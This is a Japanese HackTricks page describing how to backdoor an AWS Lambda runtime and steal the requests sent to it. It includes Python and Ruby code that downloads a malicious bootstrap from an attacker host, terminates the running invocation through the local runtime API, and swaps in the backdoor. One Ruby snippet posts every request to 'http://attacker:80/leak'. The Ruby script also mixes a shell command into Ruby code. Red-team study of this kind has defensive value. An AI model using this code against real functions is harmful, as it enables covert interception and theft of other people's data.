# AWS - Lambda リクエストの盗み方

<details>

<summary><strong>AWSのハッキングをゼロからヒーローまで学ぶには</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>をチェック！</strong></summary>

HackTricksをサポートする他の方法:

* **HackTricksにあなたの会社を広告したい**、または**HackTricksをPDFでダウンロードしたい**場合は、[**サブスクリプションプラン**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**公式のPEASS & HackTricksグッズ**](https://peass.creator-spring.com)を入手する
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見し、独占的な[**NFTs**](https://opensea.io/collection/the-peass-family)のコレクションをチェックする
* 💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)に**参加する**か、[**テレグラムグループ**](https://t.me/peass)に参加するか、**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)を**フォローする**。
* [**HackTricks**](https://github.com/carlospolop/hacktricks)と[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)のgithubリポジトリにPRを提出して、あなたのハッキングのコツを共有する。

</details>

## はじめに <a href="#python-runtime" id="python-runtime"></a>

この攻撃は、実行中のLambdaに何らかの**アクセスがある**ことを前提としています。\
また、重要な点として、**Lambdaの呼び出しは完全には分離されていないが、隔離されている**ということです。同じ実行環境で、同時には実行されませんが、実行される可能性があります。これを念頭に置いて、その環境を詳しく見ていきましょう。

### 分離

Lambdaの分離は次のcgroupsを使用します:

<figure><img src="../../../../.gitbook/assets/image (1) (1) (4).png" alt=""><figcaption></figcaption></figure>

プレフィックス 'sandbox' は一般的なコンテナエンジン(docker, podman, LXD, rkt)には一致しなかったため、独自のコンテナエンジンであり、内部的には[runC](https://github.com/opencontainers/runc)のようなオープンソースのコンテナランタイムを使用している可能性があります。

### Lambdaの仕組み  <a href="#python-runtime" id="python-runtime"></a>

これがpython Lambdaのアーキテクチャのようです:

<figure><img src="../../../../.gitbook/assets/image (2) (6).png" alt=""><figcaption></figcaption></figure>

1. コンテナの外部にあるプロセス（initバイナリ内で "**slicer**" と呼ばれている）が共有メモリを介して呼び出しイベントを **init** プロセスに送信します。
2. initプロセスはポート9001（ハードコード）でHTTPサーバーを設定し、いくつかのエンドポイントを公開します:
   1. /2018-06-01/runtime/invocation/**next** – 次の呼び出しイベントを取得
   2. /2018-06-01/runtime/invocation/{invoke-id}/**response** – 呼び出しのハンドラー応答を返す
   3. /2018-06-01/runtime/invocation/{invoke-id}/**error** – 実行エラーを返す
3. `bootstrap.py`では、次のループが**initプロセスから新しいイベントを問い合わせ**、それから**ユーザーの関数を呼び出して**処理します（ここで、アップロードしたリクエストハンドラーが実行されます）。\


<figure><img src="../../../../.gitbook/assets/image (11) (4).png" alt=""><figcaption></figcaption></figure>
4. **ハンドラーの応答は次のエンドポイントのいずれかを通じてinitプロセスに送り返されます**:
   1. `/{invoke-id}/response` – ユーザーハンドラーが正常に実行された場合
   2. `/{invoke-id}/error` – 呼び出しの処理中に例外が発生した場合

## 技術の要約 <a href="#python-runtime" id="python-runtime"></a>

Lambda関数に送信されたデータを**傍受する**ために、**bootstrapスクリプト**を悪意のあるコードに**置き換える**ことが可能です。\
他の言語での他のエンジンも、その言語で書かれた別の**bootstrapスクリプト**を持っているので、これはpythonだけでなく、他の言語を使用する他のlambdasでも行うことができます。

## Python <a href="#python-runtime" id="python-runtime"></a>

Lambdaから**`/var/runtime/bootstrap.py`** をダウンロードする（または単に**自分のlambda**を立ち上げて取得する）し、Lambdaに送信されるすべてのデータを漏洩させるバックドアを追加します。次のような数行を追加するだけです:

<figure><img src="../../../../.gitbook/assets/image (2) (1) (3).png" alt=""><figcaption></figcaption></figure>

### ランタイムの置き換え

新しい**`boostrap.py`が作成された**ので、それを**ダウンロード**し、現在のlambda**呼び出しを終了**して、正規のものと**置き換える**ために実行することが可能です:
```python
import os
from urllib import request

# Download bootstrap.py from your server
r = request.urlopen('http://attacker.com/bootstrap.py')
with open('/tmp/bootstrap.py', 'w') as f:
f.write(r.read().decode('utf-8'))

# Get invocation ID and end it
req = request.urlopen("http://127.0.0.1:9001/2018-06-01/runtime/invocation/next")
inv_id = req.headers["Lambda-Runtime-Aws-Request-Id"]
req = request.Request(f"http://127.0.0.1:9001/2018-06-01/runtime/invocation/{inv_id}/response", data=b"null")
req.add_header("Content-Type", "application/x-www-form-urlencoded")
request.urlopen(req)

# Start your bootstrap.py
os.system("python3 /tmp/bootstrap.py")
```
または、以前に行ったように呼び出しを終了し、新しいブートストラップを実行し、情報を抜き取る[twist\_runtime.py](https://github.com/twistlock/lambda-persistency-poc/blob/master/poc/twist\_runtime.py)を使用することもできます。

{% hint style="warning" %}
Lambda関数が5〜15分間使用されない場合、シャットダウンされ、次回呼び出されたときにすべての変更が失われます。
{% endhint %}

## Ruby ランタイム <a href="#ruby-runtime" id="ruby-runtime"></a>

Rubyでは、バックドアを追加したいファイルはシステムから取得するか、自分のLambdaを実行して**`/var/runtime/lib/runtime.rb`** ファイルです。

Pythonバージョンで行ったのと同じくらい簡単にバックドアを追加できます：
```ruby
# Add a require at the beggining
require 'json'
require 'net/http'
[...]
# In the loop where the invocation is treated
begin
context = lambdaContext.new(raw_request)
uri = URI('http://attacker:80/leak')
Net::HTTP.post(uri,JSON.generate(request))
[...]
```
次に、pythonバージョンで行ったことを少し変更して実行するだけです：

* **バックドアをディレクトリにダウンロードする**
* **シンボリックリンク** `/var/runtime/lib/*` をバックドアがあるディレクトリとリンクする
* 現在のlambda呼び出しを終了する
```ruby
# You can get a ruby shell with 'irb' or run from shell with ruby -e "..."

require 'net/http'

# Downloading new script
uri = URI("http://attacker/rumtime.rb")
r = Net::HTTP.get_response(uri)
File.write("/tmp/rumtime.rb", r.body)

# Create symlink
ln -s /var/runtime/lib/* /tmp

# Terminate currrent invocation
uri = URI('http://127.0.0.1:9001/2018-06-01/runtime/invocation/next')
req = Net::HTTP.get_response(uri)
inv_id = req.header['Lambda-Runtime-Aws-Request-Id']
uri = URI('http://127.0.0.1:9001/2018-06-01/runtime/invocation/'+inv_id+'/response')
Net::HTTP.post(uri, 'null')
```
## 参考文献

* [https://unit42.paloaltonetworks.com/gaining-persistency-vulnerable-lambdas/](https://unit42.paloaltonetworks.com/gaining-persistency-vulnerable-lambdas/)

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)で<strong>AWSハッキング</strong>をゼロからヒーローまで学ぶ</strong></summary>

HackTricksをサポートする他の方法:

* **HackTricksにあなたの会社を広告したい**、または**HackTricksをPDFでダウンロードしたい**場合は、[**サブスクリプションプラン**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**公式PEASS & HackTricksグッズ**](https://peass.creator-spring.com)を入手する
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見する、私たちの独占的な[**NFTs**](https://opensea.io/collection/the-peass-family)のコレクション
* 💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)や[**telegramグループ**](https://t.me/peass)に**参加する**か、**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)を**フォローする**。
* [**HackTricks**](https://github.com/carlospolop/hacktricks)と[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)のgithubリポジトリにPRを提出して、あなたのハッキングのコツを**共有する**。

</details>
